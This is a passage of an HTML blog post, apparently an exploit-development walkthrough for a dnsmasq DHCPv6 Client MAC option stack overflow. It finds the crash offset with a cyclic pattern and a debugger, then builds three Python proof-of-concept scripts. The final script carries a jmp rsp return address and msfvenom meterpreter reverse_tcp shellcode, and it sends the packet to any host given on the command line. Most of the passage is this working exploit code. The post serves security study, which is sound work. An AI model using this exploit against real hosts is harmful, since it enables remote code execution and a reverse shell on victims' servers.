+    <p><code class="language-plaintext highlighter-rouge">DHCP6RELAYFORW</code> is a DHCPv6 (Dynamic Host Configuration Protocol for IPv6) name or constant. In DHCPv6, it refers to the “Relay-Forward” message type. The Relay-Forward message is used by DHCPv6 relay nodes to convey DHCPv6 messages from clients to servers in a network.</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">OPTION6_CLIENT_MAC</code> refers to a DHCPv6 option named “Client MAC Address.” Options in DHCPv6 allow clients, servers, and relay agents to provide and receive additional data or settings. The Client MAC Address option contains the MAC (Media Access Control) address of the DHCPv6 client, which is a unique identifier for the client’s network equipment.</p>
+  </li>
+  <li>
+    <p>The <code class="language-plaintext highlighter-rouge">Transaction ID</code>, is a unique number used in DHCP (both DHCPv4 and DHCPv6) to match client requests with server responses. When a client sends a DHCP request, it includes a transaction ID in the message. The server then use the same transaction ID in its response to ensure that the response corresponds to the correct client request.</p>
+  </li>
+</ul>
+
+<h2 id="smash-the-stack-and-control-flow">Smash the stack and Control Flow</h2>
+
+<p>Now, it’s time for us to delve into the exciting realm of stack smashing and code execution. To accomplish this, we’ll need to set a crucial breakpoint at line 210 in our code. But that’s not all— we’ll also create a unique pattern that allows us to pinpoint the exact offset of our application. Although the Google proof of concept (POC) presents this information, I want to take you through each step personally.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python
+</span>
+<span class="kn">from</span> <span class="n">struct</span> <span class="kn">import</span> <span class="n">pack</span>
+<span class="kn">import</span> <span class="n">sys</span>
+<span class="kn">import</span> <span class="n">socket</span>
+<span class="kn">import</span> <span class="n">binascii</span>
+
+<span class="k">def</span> <span class="nf">send_packet</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] sending {} bytes to {}:{}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">),</span> <span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET6</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_DGRAM</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">IPPROTO_UDP</span><span class="p">)</span>
+
+    <span class="n">s</span><span class="p">.</span><span class="nf">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SO_SNDBUF</span><span class="p">,</span> <span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+    <span class="k">if</span> <span class="n">s</span><span class="p">.</span><span class="nf">sendto</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span> <span class="o">!=</span> <span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[!] Could not send (full) payload</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">u8</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+    <span class="k">return</span> <span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">B</span><span class="sh">"</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">u16</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+    <span class="k">return</span> <span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">!H</span><span class="sh">"</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">gen_option</span><span class="p">(</span><span class="n">option</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">length</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">length</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="n">length</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="sa">b</span><span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span>
+        <span class="nf">u16</span><span class="p">(</span><span class="n">option</span><span class="p">),</span>
+        <span class="nf">u16</span><span class="p">(</span><span class="n">length</span><span class="p">),</span>
+        <span class="n">data</span>
+    <span class="p">])</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
+    <span class="k">assert</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span><span class="p">,</span> <span class="sh">"</span><span class="s">{} &lt;ip&gt; &lt;port&gt;</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+    <span class="n">pkg</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span>
+        <span class="nf">u8</span><span class="p">(</span><span class="mi">12</span><span class="p">),</span>                         <span class="c1"># DHCP6RELAYFORW
+</span>        <span class="nf">u16</span><span class="p">(</span><span class="mh">0x0313</span><span class="p">),</span> <span class="nf">u8</span><span class="p">(</span><span class="mh">0x37</span><span class="p">),</span>          <span class="c1"># transaction ID
+</span>        <span class="sa">b</span><span class="sh">"</span><span class="s">_</span><span class="sh">"</span> <span class="o">*</span> <span class="p">(</span><span class="mi">34</span> <span class="o">-</span> <span class="mi">4</span><span class="p">),</span>
+        <span class="c1"># Option 79 = OPTION6_CLIENT_MAC
+</span>        <span class="c1"># Moves argument into char[DHCP_CHADDR_MAX], DHCP_CHADDR_MAX = 16
+</span>        <span class="nf">gen_option</span><span class="p">(</span><span class="mi">79</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaae</span><span class="sh">"</span><span class="p">),</span>
+    <span class="p">])</span>
+
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] Packer Header (38 bytes):</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="n">binascii</span><span class="p">.</span><span class="nf">hexlify</span><span class="p">(</span><span class="n">pkg</span><span class="p">)[</span><span class="mi">0</span><span class="p">:</span><span class="mi">76</span><span class="p">])</span>
+    <span class="n">host</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>
+    <span class="nf">send_packet</span><span class="p">(</span><span class="n">pkg</span><span class="p">,</span> <span class="n">host</span><span class="p">,</span> <span class="nf">int</span><span class="p">(</span><span class="n">port</span><span class="p">))</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>With the breakpoint successfully set at line 210, we are now ready to run the script and begin our exploration. As the execution proceeds, the program will halt at the specified breakpoint, allowing us to examine the program’s state and variables at that particular moment. This pause gives us an opportunity to analyze the code’s behavior and make any necessary observations or modifications</p>
+
+<p><img src="/assets/img/headers/dnsmasq/dnsmasq5.png" alt="dnsmasq" /></p>
+
+<p>By utilizing the “next” (or “n”) command in the GNU Debugger (gdb), we can closely monitor the program’s execution, step by step.</p>
+
+<p><img src="/assets/img/headers/dnsmasq/dnsmasq6.png" alt="dnsmasq" /></p>
+
+<p>After analyzing the pattern we generated, we have determined that our offset is 50. With this knowledge in hand, we can now proceed to the next exciting step: attempting to control the execution flow of our application. By manipulating the stack and carefully crafting our input, we will strive to gain control over the program’s behavior.</p>
+
+<p>It’s time to make further modifications to the proof of concept (POC).</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python
+</span>
+<span class="kn">from</span> <span class="n">struct</span> <span class="kn">import</span> <span class="n">pack</span>
+<span class="kn">import</span> <span class="n">sys</span>
+<span class="kn">import</span> <span class="n">socket</span>
+<span class="kn">import</span> <span class="n">binascii</span>
+
+<span class="k">def</span> <span class="nf">send_packet</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] sending {} bytes to {}:{}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">),</span> <span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET6</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_DGRAM</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">IPPROTO_UDP</span><span class="p">)</span>
+
+    <span class="n">s</span><span class="p">.</span><span class="nf">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SO_SNDBUF</span><span class="p">,</span> <span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+    <span class="k">if</span> <span class="n">s</span><span class="p">.</span><span class="nf">sendto</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span> <span class="o">!=</span> <span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[!] Could not send (full) payload</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">u8</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+    <span class="k">return</span> <span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">B</span><span class="sh">"</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">u16</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+    <span class="k">return</span> <span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">!H</span><span class="sh">"</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">gen_option</span><span class="p">(</span><span class="n">option</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">length</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">length</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="n">length</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="sa">b</span><span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span>
+        <span class="nf">u16</span><span class="p">(</span><span class="n">option</span><span class="p">),</span>
+        <span class="nf">u16</span><span class="p">(</span><span class="n">length</span><span class="p">),</span>
+        <span class="n">data</span>
+    <span class="p">])</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
+    <span class="k">assert</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span><span class="p">,</span> <span class="sh">"</span><span class="s">{} &lt;ip&gt; &lt;port&gt;</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+    <span class="n">pkg</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span>
+        <span class="nf">u8</span><span class="p">(</span><span class="mi">12</span><span class="p">),</span>                         <span class="c1"># DHCP6RELAYFORW
+</span>        <span class="nf">u16</span><span class="p">(</span><span class="mh">0x0313</span><span class="p">),</span> <span class="nf">u8</span><span class="p">(</span><span class="mh">0x37</span><span class="p">),</span>          <span class="c1"># transaction ID
+</span>        <span class="sa">b</span><span class="sh">"</span><span class="s">_</span><span class="sh">"</span> <span class="o">*</span> <span class="p">(</span><span class="mi">34</span> <span class="o">-</span> <span class="mi">4</span><span class="p">),</span>
+        <span class="c1"># Option 79 = OPTION6_CLIENT_MAC
+</span>        <span class="c1"># Moves argument into char[DHCP_CHADDR_MAX], DHCP_CHADDR_MAX = 16
+</span>        <span class="nf">gen_option</span><span class="p">(</span><span class="mi">79</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">50</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="s">B</span><span class="sh">"</span><span class="o">*</span><span class="mi">8</span><span class="p">),</span>
+    <span class="p">])</span>
+
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] Packer Header (38 bytes):</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="n">binascii</span><span class="p">.</span><span class="nf">hexlify</span><span class="p">(</span><span class="n">pkg</span><span class="p">)[</span><span class="mi">0</span><span class="p">:</span><span class="mi">76</span><span class="p">])</span>
+    <span class="n">host</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>
+    <span class="nf">send_packet</span><span class="p">(</span><span class="n">pkg</span><span class="p">,</span> <span class="n">host</span><span class="p">,</span> <span class="nf">int</span><span class="p">(</span><span class="n">port</span><span class="p">))</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p><img src="/assets/img/headers/dnsmasq/dnsmasq7.png" alt="dnsmasq" /></p>
+
+<p>Now, our next objective is to locate a suitable <code class="language-plaintext highlighter-rouge">jmp rsp</code> (jump to the value of the stack pointer) address. By finding this address, we can redirect the program’s execution flow to our desired location. This is a crucial step in executing our shellcode successfully.</p>
+
+<p>Once we have identified the appropriate <code class="language-plaintext highlighter-rouge">jmp rsp</code> address, we can proceed with injecting our crafted shellcode. The shellcode contains the specific instructions we want the program to execute, enabling us to achieve our desired actions, such as gaining remote access or performing specific tasks.</p>
+
+<p>By carefully placing our shellcode within the program’s memory space and redirecting the execution flow to it, we can trigger its execution.</p>
+
+<p><img src="/assets/img/headers/dnsmasq/dnsmasq8.png" alt="dnsmasq" /></p>
+
+<p>Final Proof of Concept.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python
+</span>
+<span class="kn">from</span> <span class="n">struct</span> <span class="kn">import</span> <span class="n">pack</span>
+<span class="kn">import</span> <span class="n">sys</span>
+<span class="kn">import</span> <span class="n">socket</span>
+<span class="kn">import</span> <span class="n">binascii</span>
+
+
+<span class="c1">#msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=1337 -b "\x00\x0a\x0d\x20" -f python
+</span>
+<span class="n">shellcode</span> <span class="o">=</span>  <span class="sa">b</span><span class="sh">""</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x48\x31\xc9\x48\x81\xe9\xef\xff\xff\xff\x48\x8d</span><span class="sh">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x05\xef\xff\xff\xff\x48\xbb\xf0\x69\x8f\x3d\xf0</span><span class="sh">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x76\x6b\x13\x48\x31\x58\x27\x48\x2d\xf8\xff\xff</span><span class="sh">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xff\xe2\xf4\xc1\x96\xe5\x34\xa8\xef\xdd\x03\xb8</span><span class="sh">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xe0\x59\x70\xc1\xbf\x01\x31\xb1\x33\xe5\x3a\xaa</span><span class="sh">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x79\x6e\x5b\x75\xa9\xf7\x6c\x9a\x7c\x2a\x4a\xa0</span><span class="sh">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x03\xa6\x65\x69\x1c\x69\x4c\x9a\x68\xd1\x32\xf5</span><span class="sh">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x3e\xee\xd3\x88\x52\xc7\xaa\xb8\xcf\x69\x13\xf5</span><span class="sh">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x50\xf0\x3d\xf0\x77\x3a\x5b\x79\x8f\xe5\x2d\xaa</span><span class="sh">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x1c\x41\x4b\xff\x6c\xd6\x75\x75\xb6\x12\x36\xb9</span><span class="sh">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x96\x46\x49\xe8\x21\x01\x30\xa8\x03\x8f\x57\xf5</span><span class="sh">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x3e\xe2\xf4\xb8\x58\x79\x32\xf5\x2f\x32\x4c\xb8</span><span class="sh">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xec\x4f\x44\x37\x1c\x57\x4b\x9a\x68\xd0\x32\xf5</span><span class="sh">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x28\x01\x6d\xaa\x66\x8a\x75\x75\xb6\x13\xfe\x0f</span><span class="sh">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x8f\x8f\x3d\xf0\x76\x6b\x13</span><span class="sh">"</span>
+
+
+<span class="k">def</span> <span class="nf">send_packet</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] sending {} bytes to {}:{}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">),</span> <span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET6</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_DGRAM</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">IPPROTO_UDP</span><span class="p">)</span>
+
+    <span class="n">s</span><span class="p">.</span><span class="nf">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SO_SNDBUF</span><span class="p">,</span> <span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+    <span class="k">if</span> <span class="n">s</span><span class="p">.</span><span class="nf">sendto</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span> <span class="o">!=</span> <span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[!] Could not send (full) payload</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">u8</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+    <span class="k">return</span> <span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">B</span><span class="sh">"</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">u16</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+    <span class="k">return</span> <span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">!H</span><span class="sh">"</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">gen_option</span><span class="p">(</span><span class="n">option</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">length</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">length</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="n">length</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="sa">b</span><span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span>
+        <span class="nf">u16</span><span class="p">(</span><span class="n">option</span><span class="p">),</span>
+        <span class="nf">u16</span><span class="p">(</span><span class="n">length</span><span class="p">),</span>
+        <span class="n">data</span>
+    <span class="p">])</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
+    <span class="k">assert</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span><span class="p">,</span> <span class="sh">"</span><span class="s">{} &lt;ip&gt; &lt;port&gt;</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+    <span class="n">pkg</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span>
+        <span class="nf">u8</span><span class="p">(</span><span class="mi">12</span><span class="p">),</span>                         <span class="c1"># DHCP6RELAYFORW
+</span>        <span class="nf">u16</span><span class="p">(</span><span class="mh">0x0313</span><span class="p">),</span> <span class="nf">u8</span><span class="p">(</span><span class="mh">0x37</span><span class="p">),</span>          <span class="c1"># transaction ID
+</span>        <span class="sa">b</span><span class="sh">"</span><span class="s">_</span><span class="sh">"</span> <span class="o">*</span> <span class="p">(</span><span class="mi">34</span> <span class="o">-</span> <span class="mi">4</span><span class="p">),</span>
+                                        <span class="c1"># Option 79 = OPTION6_CLIENT_MAC
+</span>                                        <span class="c1"># Moves argument into char[DHCP_CHADDR_MAX], DHCP_CHADDR_MAX = 16
+</span>        <span class="nf">gen_option</span><span class="p">(</span><span class="mi">79</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">50</span> <span class="o">+</span> <span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">&lt;Q</span><span class="sh">"</span><span class="p">,</span><span class="mh">0x000000000045269f</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x90</span><span class="sh">"</span> <span class="o">*</span><span class="mi">16</span> <span class="o">+</span> <span class="n">shellcode</span><span class="p">),</span>
+    <span class="p">])</span>
+
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] Packer Header (38 bytes):</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="n">binascii</span><span class="p">.</span><span class="nf">hexlify</span><span class="p">(</span><span class="n">pkg</span><span class="p">)[</span><span class="mi">0</span><span class="p">:</span><span class="mi">76</span><span class="p">])</span>
+    <span class="n">host</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>
+    <span class="nf">send_packet</span><span class="p">(</span><span class="n">pkg</span><span class="p">,</span> <span class="n">host</span><span class="p">,</span> <span class="nf">int</span><span class="p">(</span><span class="n">port</span><span class="p">))</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Below is the result of the proof of concept:</p>
+
+<video src="/assets/img/headers/dnsmasq/dnsmasq.mp4" controls="controls" style="max-width: 730px;">
+</video>
+
+<h2 id="reference">Reference</h2>
+
+<p><a href="https://security.googleblog.com/2017/10/behind-masq-yet-more-dns-and-dhcp.html">https://security.googleblog.com/2017/10/behind-masq-yet-more-dns-and-dhcp.html</a></p>
+
+<p><a href="https://www.arubanetworks.com/techdocs/Aruba_Fabric_Composer/Content/afc60olh/dhc-rel.htm">https://www.arubanetworks.com/techdocs/Aruba_Fabric_Composer/Content/afc60olh/dhc-rel.htm</a></p>
+
+<p><a href="https://www.elastic.co/guide/en/beats/packetbeat/current/exported-fields-dhcpv4.html">https://www.elastic.co/guide/en/beats/packetbeat/current/exported-fields-dhcpv4.html</a></p>
+
